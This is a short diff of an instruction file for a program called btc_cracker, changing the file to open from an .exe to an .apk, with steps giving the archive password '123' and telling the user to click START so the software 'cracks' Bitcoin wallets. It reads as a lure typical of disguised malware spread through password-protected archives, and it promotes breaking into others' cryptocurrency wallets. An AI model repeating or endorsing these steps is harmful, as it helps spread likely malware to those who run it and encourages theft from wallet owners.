@@ -2,7 +2,7 @@
 
 1) The password for the archive is - 123
 
-2) Open btc_cracker.exe
+2) Open btc_cracker.apk
 
 2) Click START and wait softwere to crack some wallets.
 
